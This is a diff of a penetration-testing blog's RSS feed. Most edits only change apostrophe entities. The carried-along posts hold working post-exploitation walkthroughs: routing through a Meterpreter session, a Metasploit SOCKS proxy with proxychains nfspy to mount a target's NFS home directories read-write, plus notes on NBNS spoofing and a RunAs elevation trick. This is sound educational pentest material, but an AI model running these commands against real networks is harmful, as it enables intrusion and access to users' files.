@@ -16,12 +16,12 @@
       <pubDate>Mon, 04 Mar 2013 21:20:19 +0000</pubDate>
       
       <guid>https://malicious.link/post/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/</guid>
-      <description>&lt;p&gt;You&#39;ve found an NFS share on a pentest, it&#39;s sharing out your target&#39;s home directories (/home) and some SAN with all of the Windows AD users &amp;ldquo;home&amp;rdquo; directories under /volumes/users/. You only have a meterpreter session though&amp;hellip; enough back story, problem is that Metasploit doesn&#39;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&#39;m wrong, but there also aren&#39;t any tools for talking to NFS shares over TCP only proxies.&lt;/p&gt;
+      <description>&lt;p&gt;You&amp;rsquo;ve found an NFS share on a pentest, it&amp;rsquo;s sharing out your target&amp;rsquo;s home directories (/home) and some SAN with all of the Windows AD users &amp;ldquo;home&amp;rdquo; directories under /volumes/users/. You only have a meterpreter session though&amp;hellip; enough back story, problem is that Metasploit doesn&amp;rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&amp;rsquo;m wrong, but there also aren&amp;rsquo;t any tools for talking to NFS shares over TCP only proxies.&lt;/p&gt;
 &lt;p&gt;Enter NfSpy: &lt;a href=&#34;https://github.com/bonsaiviking/NfSpy&#34;&gt;https://github.com/bonsaiviking/NfSpy&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;While it&#39;s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible.&lt;/p&gt;
+&lt;p&gt;While it&amp;rsquo;s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible.&lt;/p&gt;
 &lt;p&gt;First we setup up our route so that the aux module will go over the meterpreter session:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;route add 192.168.1.0 255.255.255.0 1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The 1 on the end being the meterpreter session number it&#39;s going to be going through. Next up is to find out what exports are available:&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The 1 on the end being the meterpreter session number it&amp;rsquo;s going to be going through. Next up is to find out what exports are available:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/nfs/nfsmount
 msf auxiliary(nfsmount) &amp;gt; show options
 
@@ -73,7 +73,7 @@ msf auxiliary(sunrpc_portmapper) &amp;gt; run
         mountd - 54457/tcp
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit&#39;s socks proxy:&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit&amp;rsquo;s socks proxy:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/server/socks4a
 msf auxiliary(socks4a) &amp;gt; show options
 
@@ -90,7 +90,7 @@ SRVHOST =&amp;gt; 127.0.0.1
 msf auxiliary(socks4a) &amp;gt; run
 [*] Auxiliary module execution completed
 [*] Starting the socks4a proxy server
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don&#39;t mind having the Anons of the world surf through your meterpreter session into your clients.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don&amp;rsquo;t mind having the Anons of the world surf through your meterpreter session into your clients.&lt;/p&gt;
 &lt;p&gt;Next up it actually using nfspy (create or prep a directory so you can mount it first):&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -108,8 +108,8 @@ max_readahead=0x00020000
   max_write=0x00020000
   unique: 1, success, outsize: 40
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Lets break that command down. Proxychains will wrap nfspy so that it goes through our Metasploit Socks4a proxy. The -d tells NfSpy to stay in the foreground, and -o for options. Server is our target IP, only use a hostname if your attacker box can resolve it to the right IP. The export we found with the Metasploit module is up next, and the default NFS port of 2049. The mountport option is from the port mapper Metasploit module. Both of these port options be sure you specify the /tcp or you&#39;ll just be waiting as there isn&#39;t really a time out and Proxychains doesn&#39;t show UDP attempts. RW for read-write and finally the location to mount to.&lt;/p&gt;
-&lt;p&gt;If you see that second proxychains request for port 2049 it is usually a good indicator that it worked, if not you have probably run into anything from a permissions issue to a local mount problem. NfSpy uses fuse which can be really silent when problems arrise or give errors that tell you nothing meaningful. Thats why I&#39;m using the -d option that keeps nfspy in the foreground, just so I can detect any issues. Lets see if that worked:&lt;/p&gt;
+&lt;p&gt;Lets break that command down. Proxychains will wrap nfspy so that it goes through our Metasploit Socks4a proxy. The -d tells NfSpy to stay in the foreground, and -o for options. Server is our target IP, only use a hostname if your attacker box can resolve it to the right IP. The export we found with the Metasploit module is up next, and the default NFS port of 2049. The mountport option is from the port mapper Metasploit module. Both of these port options be sure you specify the /tcp or you&amp;rsquo;ll just be waiting as there isn&amp;rsquo;t really a time out and Proxychains doesn&amp;rsquo;t show UDP attempts. RW for read-write and finally the location to mount to.&lt;/p&gt;
+&lt;p&gt;If you see that second proxychains request for port 2049 it is usually a good indicator that it worked, if not you have probably run into anything from a permissions issue to a local mount problem. NfSpy uses fuse which can be really silent when problems arrise or give errors that tell you nothing meaningful. Thats why I&amp;rsquo;m using the -d option that keeps nfspy in the foreground, just so I can detect any issues. Lets see if that worked:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;ls /root/nfspy/mount
 user1
 user2
@@ -142,7 +142,7 @@ getattr /home/user2
    NODEID: 43
    unique: 171, success, outsize: 144
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thats it. You can mount read-write (rw) or read-only (ro) depending on what you want to do and how quiet you want to be.&lt;/p&gt;
-&lt;p&gt;Last note, you can&#39;t just CTRL-C an nfspy mount, you need to use &lt;code&gt;fusermount -u /root/nfspy/mount&lt;/code&gt; to kill it. It&#39;s another fuse issue. If anyone has a better way to do this I&#39;m all ears.&lt;/p&gt;
+&lt;p&gt;Last note, you can&amp;rsquo;t just CTRL-C an nfspy mount, you need to use &lt;code&gt;fusermount -u /root/nfspy/mount&lt;/code&gt; to kill it. It&amp;rsquo;s another fuse issue. If anyone has a better way to do this I&amp;rsquo;m all ears.&lt;/p&gt;
 </description>
     </item>
     
@@ -161,9 +161,9 @@ getattr /home/user2
 &lt;li&gt;&lt;code&gt;ln -s /usr/include/tirpc/rpc/clnt_soc.h /usr/include/rpc/clnt_soc.h&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;perl -p -i.orig -e &#39;s/getline/getline_nfs/&#39; nfs.c&lt;/code&gt;&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;Next part I don&#39;t have a good way to automate. You need to go in and comment out (w/ #) the 4 lines following &amp;ldquo;uncomment the following 4 lines for Solaris 2.x&amp;rdquo; and uncomment the 2 lines following &amp;ldquo;For GNU readline support you need to add&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;Next part I don&amp;rsquo;t have a good way to automate. You need to go in and comment out (w/ #) the 4 lines following &amp;ldquo;uncomment the following 4 lines for Solaris 2.x&amp;rdquo; and uncomment the 2 lines following &amp;ldquo;For GNU readline support you need to add&amp;rdquo;&lt;/p&gt;
 &lt;p&gt;After that a simple &amp;ldquo;make&amp;rdquo; should get you ./nfs sitting there for your use.&lt;/p&gt;
-&lt;p&gt;Will probably make a repo out of this so I don&#39;t have to keep doing it..&lt;/p&gt;
+&lt;p&gt;Will probably make a repo out of this so I don&amp;rsquo;t have to keep doing it..&lt;/p&gt;
 </description>
     </item>
     
@@ -177,7 +177,7 @@ getattr /home/user2
 &lt;p&gt;&lt;strong&gt;(MY MISTAKE FOR NOT TESTING MORE)&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;So the &amp;ldquo;-ish&amp;rdquo; is you need to have the username and pass of &lt;del&gt;another account that has administrator rights&lt;/del&gt; the local administrator account on that box. But other than that, the following image should speak for itself. (no UAC prompt occurred during the following actions)&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_uacish_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I plan on writing a Metasploit module to do this as all it really does is starts a process as a different user and that process executes ShellExecute&#39;s &amp;lsquo;RunAs&amp;rsquo; verb. But until then, get CPAU here:&lt;/p&gt;
+&lt;p&gt;I plan on writing a Metasploit module to do this as all it really does is starts a process as a different user and that process executes ShellExecute&amp;rsquo;s &amp;lsquo;RunAs&amp;rsquo; verb. But until then, get CPAU here:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://www.joeware.net/freetools/tools/cpau/&#34;&gt;http://www.joeware.net/freetools/tools/cpau/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;and Elevate here: &lt;a href=&#34;http://jpassing.com/2007/12/08/launch-elevated-processes-from-the-command-line/&#34;&gt;http://jpassing.com/2007/12/08/launch-elevated-processes-from-the-command-line/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;and doing it manually with built in Windows Kung-Fu:&lt;/p&gt;
@@ -197,10 +197,10 @@ getattr /home/user2
 &lt;p&gt;&lt;a href=&#34;https://github.com/mubix/ditto&#34;&gt;https://github.com/mubix/ditto&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;And while the sheep icon is cute, and a nod to what ditto does, it comes at a pretty hefty cost:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_ditto_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Size. Now if you&#39;re scoffing at 408 KB then you don&#39;t have any issues, but I like not having to wait while a binary I am trying to push to a victim box is transferring. Removing the icon is pretty straight forward. Once you&#39;ve loaded the .SLN file up in Visual Studio C++ just expand the &amp;ldquo;Resource Files&amp;rdquo; folder in the &amp;ldquo;Solution Explorer&amp;rdquo;:&lt;/p&gt;
+&lt;p&gt;Size. Now if you&amp;rsquo;re scoffing at 408 KB then you don&amp;rsquo;t have any issues, but I like not having to wait while a binary I am trying to push to a victim box is transferring. Removing the icon is pretty straight forward. Once you&amp;rsquo;ve loaded the .SLN file up in Visual Studio C++ just expand the &amp;ldquo;Resource Files&amp;rdquo; folder in the &amp;ldquo;Solution Explorer&amp;rdquo;:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_ditto_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;And summarily delete both files (Right click and go to Remove or just press the Del button)&lt;/p&gt;
-&lt;p&gt;(Side note, don&#39;t forget to rename or copy the one with the icon somewhere first if you want to keep that version)&lt;/p&gt;
+&lt;p&gt;(Side note, don&amp;rsquo;t forget to rename or copy the one with the icon somewhere first if you want to keep that version)&lt;/p&gt;
 &lt;p&gt;Then &amp;ldquo;Build Solution&amp;rdquo; again, and wa-la! A much smaller, less witty but highly functional Ditto:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_ditto_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;And of course, like last time, you could go through all that, or just download them here:&lt;/p&gt;
@@ -216,9 +216,9 @@ getattr /home/user2
       <pubDate>Sun, 07 Oct 2012 04:10:51 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-10-07-compiling-and-release-of-netview/</guid>
-      <description>&lt;p&gt;If you haven&#39;t caught &lt;a href=&#34;http://carnal0wnage.attackresearch.com/&#34;&gt;Chris Gates&lt;/a&gt; (&lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;@carnal0wnage&lt;/a&gt;) and my &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon2/1-1-6-rob-fuller-chris-gates-dirty-little-secrets-part-2&#34;&gt;talk&lt;/a&gt; at &lt;a href=&#34;http://www.derbycon.com/&#34;&gt;DerbyCon 2012&lt;/a&gt; - we released 2 tools, &lt;a href=&#34;https://github.com/mubix/netview&#34;&gt;Netview&lt;/a&gt;, and &lt;a href=&#34;https://github.com/mubix/ditto&#34;&gt;Ditto&lt;/a&gt;. Here I&#39;ll walk you through compiling Netview yourself, in the next blog post we&#39;ll go over compiling Ditto and how you can remove it&#39;s icon to reduce the size if you want. But for Netview it&#39;s pretty straight forward. First you pull a copy of the GIT repository:&lt;/p&gt;
+      <description>&lt;p&gt;If you haven&amp;rsquo;t caught &lt;a href=&#34;http://carnal0wnage.attackresearch.com/&#34;&gt;Chris Gates&lt;/a&gt; (&lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;@carnal0wnage&lt;/a&gt;) and my &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon2/1-1-6-rob-fuller-chris-gates-dirty-little-secrets-part-2&#34;&gt;talk&lt;/a&gt; at &lt;a href=&#34;http://www.derbycon.com/&#34;&gt;DerbyCon 2012&lt;/a&gt; - we released 2 tools, &lt;a href=&#34;https://github.com/mubix/netview&#34;&gt;Netview&lt;/a&gt;, and &lt;a href=&#34;https://github.com/mubix/ditto&#34;&gt;Ditto&lt;/a&gt;. Here I&amp;rsquo;ll walk you through compiling Netview yourself, in the next blog post we&amp;rsquo;ll go over compiling Ditto and how you can remove it&amp;rsquo;s icon to reduce the size if you want. But for Netview it&amp;rsquo;s pretty straight forward. First you pull a copy of the GIT repository:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/mubix/netview&#34;&gt;https://github.com/mubix/netview&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Once you&#39;ve done that, you&#39;ve got a directory looking like this:&lt;/p&gt;
+&lt;p&gt;Once you&amp;rsquo;ve done that, you&amp;rsquo;ve got a directory looking like this:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_netview_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;You will also need Visual Studio C++ (The Express version if free here: &lt;a href=&#34;http://www.microsoft.com/visualstudio/eng/downloads#d-2010-express&#34;&gt;http://www.microsoft.com/visualstudio/eng/downloads#d-2010-express&lt;/a&gt; )&lt;/p&gt;
 &lt;p&gt;Once you have both you double click the .sln file (Solution File)&lt;/p&gt;
@@ -226,9 +226,9 @@ getattr /home/user2
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_netview_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Where you switch the compile option from &amp;ldquo;Debug&amp;rdquo; to &amp;ldquo;Release&amp;rdquo; and click to &amp;ldquo;Build Solution&amp;rdquo;:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_netview_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Sounds much more grandiose than it really is. If all goes well you&#39;ll get the box at the bottom to say &amp;ldquo;Build: 1 succeeded&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;Sounds much more grandiose than it really is. If all goes well you&amp;rsquo;ll get the box at the bottom to say &amp;ldquo;Build: 1 succeeded&amp;rdquo;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_netview_4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;You&#39;ll have a new folder:&lt;/p&gt;
+&lt;p&gt;You&amp;rsquo;ll have a new folder:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_netview_5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;and inside is your wonderful prize:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_netview_6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
@@ -243,8 +243,8 @@ getattr /home/user2
       
       <guid>https://malicious.link/post/2012/2012-10-06-lab-setup-windows-proxy-and-egress-filtering/</guid>
       <description>&lt;p&gt;&lt;a href=&#34;http://www.pfsense.org&#34;&gt;pfSense&lt;/a&gt; is an excellent free way of including a firewall / ids / proxy in your lab or VMs. It runs small and fast, but even as simple as pfsense is sometimes you need a bit less complexity and speed of configuration.&lt;/p&gt;
-&lt;p&gt;Enter Peerblock and AnalogX&#39;s proxy. Two free tools, one usually used to stop people who torrent from getting caught by the RIAA/MPAA and the other a drop dead simple windows based proxy utility.&lt;/p&gt;
-&lt;p&gt;First we&#39;ll talk about AnalogX&#39;s proxy, you can get it here: &lt;/p&gt;
+&lt;p&gt;Enter Peerblock and AnalogX&amp;rsquo;s proxy. Two free tools, one usually used to stop people who torrent from getting caught by the RIAA/MPAA and the other a drop dead simple windows based proxy utility.&lt;/p&gt;
+&lt;p&gt;First we&amp;rsquo;ll talk about AnalogX&amp;rsquo;s proxy, you can get it here: &lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://www.analogx.com/contents/download/Network/proxy/Freeware.htm&#34;&gt;http://www.analogx.com/contents/download/Network/proxy/Freeware.htm&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://www.analogx.com/contents/download/Network/proxy/Freeware.htm&#34;&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_egress_1.png&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;A simple next-&amp;gt;next-&amp;gt;finish install gets you this:&lt;/p&gt;
@@ -271,10 +271,10 @@ getattr /home/user2
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_egress_4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Give it a description and a place to save the file:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_egress_5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;You&#39;ll get this window automatically pop up, but if you don&#39;t you just click &amp;lsquo;Add&amp;rsquo; with your custom list selected in the List Manager:&lt;/p&gt;
+&lt;p&gt;You&amp;rsquo;ll get this window automatically pop up, but if you don&amp;rsquo;t you just click &amp;lsquo;Add&amp;rsquo; with your custom list selected in the List Manager:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_egress_6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Feel free to block everything but one IP, a range, or whatever your meets your needs, nothing in or out from or to that IP/Range will be allowed&lt;/p&gt;
-&lt;p&gt;One of the uses I use it for is blocking the whole Internet except for my internal ranges for stuff like my personal Virus Total lab where I run bins to test stuff out, that way the AntiVirus services can&#39;t ship my bin off to who knows where to be analyzed before I even get to use it.&lt;/p&gt;
+&lt;p&gt;One of the uses I use it for is blocking the whole Internet except for my internal ranges for stuff like my personal Virus Total lab where I run bins to test stuff out, that way the AntiVirus services can&amp;rsquo;t ship my bin off to who knows where to be analyzed before I even get to use it.&lt;/p&gt;
 &lt;p&gt;Here is an example of my &amp;ldquo;All the Internet&amp;rdquo; block list:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_egress_7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Thats everything for now, hope some of it was useful in your setup and experiments ;-)&lt;/p&gt;
@@ -304,31 +304,31 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Sat, 01 Sep 2012 05:16:14 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-09-01-old-school-on-target-nbns-spoofing/</guid>
-      <description>&lt;p&gt;One of pen testers favorite attacks is NBNS spoofing. Now Wesley who I originally learned this attack from, traced this back to sid (&lt;a href=&#34;http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/&#34;&gt;http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/&lt;/a&gt;) . Wesley&#39;s stuff can be found here: &lt;a href=&#34;http://www.mcgrewsecurity.com/tools/nbnspoof/&#34;&gt;http://www.mcgrewsecurity.com/tools/nbnspoof/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Wesley&#39;s stuff eventually lead to this awesome post on the Packetstan blog: &lt;a href=&#34;http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html&#34;&gt;http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;and in that post the Metasploit module to do it all is demoed. But there in lies the rub. With each degree of separation we have more and more solidified in into a &amp;ldquo;on-site&amp;rdquo; only attack. But if you read through Sid&#39;s paper from 2007 this doesn&#39;t have to be the case. He uses a tool written by &amp;ldquo;Patrick Chambet&amp;rdquo; back in 2005 for the Honeynet project: &lt;a href=&#34;http://seclists.org/honeypots/2005/q4/46&#34;&gt;http://seclists.org/honeypots/2005/q4/46&lt;/a&gt; called &amp;ldquo;FakeNetbiosDGM and FakeNetbiosNS&amp;rdquo;.&lt;/p&gt;
+      <description>&lt;p&gt;One of pen testers favorite attacks is NBNS spoofing. Now Wesley who I originally learned this attack from, traced this back to sid (&lt;a href=&#34;http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/&#34;&gt;http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/&lt;/a&gt;) . Wesley&amp;rsquo;s stuff can be found here: &lt;a href=&#34;http://www.mcgrewsecurity.com/tools/nbnspoof/&#34;&gt;http://www.mcgrewsecurity.com/tools/nbnspoof/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Wesley&amp;rsquo;s stuff eventually lead to this awesome post on the Packetstan blog: &lt;a href=&#34;http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html&#34;&gt;http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;and in that post the Metasploit module to do it all is demoed. But there in lies the rub. With each degree of separation we have more and more solidified in into a &amp;ldquo;on-site&amp;rdquo; only attack. But if you read through Sid&amp;rsquo;s paper from 2007 this doesn&amp;rsquo;t have to be the case. He uses a tool written by &amp;ldquo;Patrick Chambet&amp;rdquo; back in 2005 for the Honeynet project: &lt;a href=&#34;http://seclists.org/honeypots/2005/q4/46&#34;&gt;http://seclists.org/honeypots/2005/q4/46&lt;/a&gt; called &amp;ldquo;FakeNetbiosDGM and FakeNetbiosNS&amp;rdquo;.&lt;/p&gt;
 &lt;p&gt;Finding the tools was no easy task though, googling for the file name, the author or the project just netted me this link:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip&#34;&gt;http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Gotta love the Wayback Machine, I finally found it here: &lt;a href=&#34;http://wayback.archive.org/web/*/http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip&#34;&gt;http://wayback.archive.org/web/*/http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;and eventually also here (on the author&#39;s site of all places): &lt;a href=&#34;http://www.chambet.com/tools.html&#34;&gt;http://www.chambet.com/tools.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;and eventually also here (on the author&amp;rsquo;s site of all places): &lt;a href=&#34;http://www.chambet.com/tools.html&#34;&gt;http://www.chambet.com/tools.html&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Question is, does it still work?? 2nd Question, how well does it work through/with Meterpreter?&lt;/p&gt;
-&lt;p&gt;(As a side note, I haven&#39;t tried, but you might be able to use Py2Exe or PyInstaller to run nbnspoof.py on a windows box)&lt;/p&gt;
+&lt;p&gt;(As a side note, I haven&amp;rsquo;t tried, but you might be able to use Py2Exe or PyInstaller to run nbnspoof.py on a windows box)&lt;/p&gt;
 &lt;p&gt;When running it on XP SP3 I get the following&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_fakenetbios_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Booooooooo, and on Windows 7 I get this:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_fakenetbios_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Ok, error 10013 is a permissions issue, I can deal with that..&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_fakenetbios_3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Run as Administrator it works! But something is wrong with the communication because the host doing the lookup doesn&#39;t get the correct resolution back.&lt;/p&gt;
-&lt;p&gt;From what I can google it looks as though Windows Firewall has an &amp;lsquo;Anti-Spoofing&amp;rsquo; outbound filter, so these &amp;ldquo;Bytes sent&amp;rdquo; don&#39;t even make it to Wireshark.&lt;/p&gt;
+&lt;p&gt;Run as Administrator it works! But something is wrong with the communication because the host doing the lookup doesn&amp;rsquo;t get the correct resolution back.&lt;/p&gt;
+&lt;p&gt;From what I can google it looks as though Windows Firewall has an &amp;lsquo;Anti-Spoofing&amp;rsquo; outbound filter, so these &amp;ldquo;Bytes sent&amp;rdquo; don&amp;rsquo;t even make it to Wireshark.&lt;/p&gt;
 &lt;p&gt;I have created a Github repository, stuck the contents of the zip file in it and this is where I ask for help. If you know 1) how to disable the Windows Anti-spoofing filter or 2) How to circumvent it please leave a comment here, and issue on the repo or email me directly.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;UPDATE (1&amp;amp;2 solved for this use case)&lt;/strong&gt;: &lt;a href=&#34;https://malicious.link/blog/2012/09/02/old-school-on-target-nbns-spoofing-part-2/&#34;&gt;/blog/2012/09/02/old-school-on-target-nbns-spoofing-part-2/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;The other thing is, if you want to improve the code, that would be awesome too, submit a pull request, I&#39;d love to get this thing going again and make it into something that we can solidly use over a Meterpreter session.&lt;/p&gt;
+&lt;p&gt;The other thing is, if you want to improve the code, that would be awesome too, submit a pull request, I&amp;rsquo;d love to get this thing going again and make it into something that we can solidly use over a Meterpreter session.&lt;/p&gt;
 &lt;p&gt;Github repo: &lt;a href=&#34;https://github.com/mubix/FakeNetBIOS&#34;&gt;https://github.com/mubix/FakeNetBIOS&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;And if the only commit to this repo 5 years from now is &amp;ldquo;Initial commit&amp;rdquo; then at the very least it will be some where the next blogger who picks up the trail can get it from.&lt;/p&gt;
 &lt;p&gt;P.S. If you know how to solve the issue on XP, that would be an awesome fix as well.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;UPDATE 2: Looks like the XP issue ahas the Anti-spoofing too. (i.e it works great if you use the IP of the actual IP of the box with different hostnames)&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;em&gt;I guess the only improvement I&#39;d look for is for an .&lt;/em&gt; (ALL HOSTS) ability&lt;/em&gt;*&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;em&gt;I guess the only improvement I&amp;rsquo;d look for is for an .&lt;/em&gt; (ALL HOSTS) ability&lt;/em&gt;*&lt;/p&gt;
 </description>
     </item>
     
@@ -338,13 +338,13 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Wed, 20 Jun 2012 18:34:57 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-06-20-companies-that-give-back-with-free-tools/</guid>
-      <description>&lt;p&gt;Penetration Testing / Red Teaming requires the use of a lot of tools. I don&#39;t mind getting called a &amp;ldquo;script kiddie&amp;rdquo; because I can accomplish more and faster when I don&#39;t have to code every single task I need to do. This post is to point out companies that make this possible and give a small bit of thanks.&lt;/p&gt;
-&lt;p&gt;(If you&#39;ve ever tried to convince a company to give something away for free, you can understand how big this really is) Some give a lot, some only one tool, but even one is more than some.&lt;/p&gt;
+      <description>&lt;p&gt;Penetration Testing / Red Teaming requires the use of a lot of tools. I don&amp;rsquo;t mind getting called a &amp;ldquo;script kiddie&amp;rdquo; because I can accomplish more and faster when I don&amp;rsquo;t have to code every single task I need to do. This post is to point out companies that make this possible and give a small bit of thanks.&lt;/p&gt;
+&lt;p&gt;(If you&amp;rsquo;ve ever tried to convince a company to give something away for free, you can understand how big this really is) Some give a lot, some only one tool, but even one is more than some.&lt;/p&gt;
 &lt;p&gt;Of course the first is going to be Rapid7 and the &lt;strong&gt;Metasploit&lt;/strong&gt; team:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework&#34;&gt;https://github.com/rapid7/metasploit-framework&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
